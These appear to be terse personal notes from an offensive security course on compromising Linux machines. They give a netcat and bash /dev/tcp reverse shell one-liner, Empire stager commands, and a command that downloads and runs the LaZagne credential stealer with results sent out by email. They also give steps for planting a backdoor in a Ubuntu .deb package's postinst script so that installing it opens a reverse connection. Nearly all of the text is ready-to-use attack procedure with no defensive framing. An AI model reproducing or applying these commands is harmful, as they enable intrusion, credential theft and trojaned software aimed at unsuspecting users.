Reverse shell with one command: netcat
    on host:    $ nc -nvlp <port>
    on target:  $ bash -i >& /dev/tcp/<host ip>/<port>  0>&1


Empire
    usestager multi/bash 
    set Listener http
    set OutFile linux_bash_shell_empire
    execute

ZLogger 
    works the same as for windows (compile for linux - its best to compile on the exact same linux distro)

LazaGne
    works the same as for windows (just download/compile for linux)

Execute and report (via email)
    https://github.com/z00z/ZReporter

    use shell COMMAND: cd /tmp/ && wget -q <direct url to LazaGne> && chmod +x Lazagne && ./LazaGne all 

Embadding backdoors in ubuntu packages
    choose a package from https://packages.ubuntu.com/
    
        sudo dpkg -x Downloads/flashplugin-installer_32.0.0.465ubuntu0.20.04.2_amd64.deb flash-update
        ar -x Downloads/flashplugin-installer_32.0.0.465ubuntu0.20.04.2_amd64.deb 
            -> looking for control.tar.xz. -> Extract and edit/add postinst file (make it contain bash line from backdoor.bash)
            -> package this again $ dpkg-deb --build flash-update
            -> deliver that deb-file to get a reverse connection!

